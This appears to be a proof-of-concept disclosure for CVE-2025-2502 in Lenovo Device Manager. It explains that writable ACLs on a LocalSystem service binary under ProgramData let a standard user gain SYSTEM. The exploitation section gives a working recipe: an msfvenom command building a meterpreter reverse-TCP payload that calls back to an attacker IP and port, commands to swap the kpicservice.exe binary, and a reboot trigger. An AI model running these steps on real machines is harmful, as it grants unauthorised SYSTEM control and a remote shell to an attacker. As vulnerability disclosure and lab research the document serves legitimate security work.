# CVE-2025-2502 — Lenovo Device Manager: Local Privilege Escalation (POC)

## Vulnerability Overview

While studying local privilege escalation techniques in a Windows lab, I installed Lenovo Device Manager to inspect its installed components. Browsing the ProgramData modules out of curiosity, I noticed oddly permissive ACLs on the module directories — files downloaded by the application were writable by standard users.

That raised a red flag: if a service binary stored in such a directory runs as LocalSystem, and a non-privileged user can alter the file content, a simple replace-and-reboot could make the service execute attacker-controlled code as SYSTEM.

## TL;DR

A permissions flaw in Lenovo Device Manager (all versions observed) grants non-privileged users **F (Full) control** over downloaded tool binaries under `C:\ProgramData\Lenovo\devicecenter\modules\…`. A privileged service (`KPICService_Lenovo`) loads one such binary as LocalSystem; because an unprivileged user can replace that binary on disk, the service will start the replaced binary as SYSTEM after a reboot — enabling local privilege escalation.

![Vulnerability Overview](https://github.com/user-attachments/assets/b93b76b1-f2f2-436f-a5dd-72f4248600af)

## Lab Setup & Reproduction

### 1. Setup Lab Environment

- Host a Windows VM and take a snapshot
- Install Lenovo Device Manager and the AI Picture plugin (vulnerable version)
- Ensure the VM is isolated from production networks

![Lab Setup](https://github.com/user-attachments/assets/9fcdeeaf-3600-4dc7-b646-6e7e8bc78c5a)

### 2. Confirm Service & Permissions

Inspect the service configuration and file permissions:

**Service Location:**

C:\ProgramData\Lenovo\devicecenter\modules\aipicture\5.1.80.8121\kpicservice.exe


![Service Configuration](https://github.com/user-attachments/assets/ef41db4c-c148-4512-ad15-a8eb82d14427)

![File Permissions](https://github.com/user-attachments/assets/e33ef6fe-910d-48cc-beab-0f4d2f841f6e)

### 3. Validate Replace-on-Disk Scenario

With the system booted into a state where the service process is locked, confirm an unprivileged account can move or rename the original `kpicservice.exe` file.

## Practical Exploitation Steps

### Step 1: Generate Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.133 LPORT=4444 -f exe -o kpicservice.exe

# Move original file
move C:\ProgramData\Lenovo\devicecenter\modules\aipicture\5.1.80.8121\kpicservice.exe kpicservice.exe.backup

# Replace with payload
move Desktop\kpicservice.exe C:\ProgramData\Lenovo\devicecenter\modules\aipicture\5.1.80.8121\kpicservice.exe

###Trigger Exploitation
Reboot the device

The service automatically starts the replaced kpicservice.exe (payload)

Obtain SYSTEM privileges

https://github.com/user-attachments/assets/35d8f450-356e-47b0-b4dd-41f5bbe6d31b
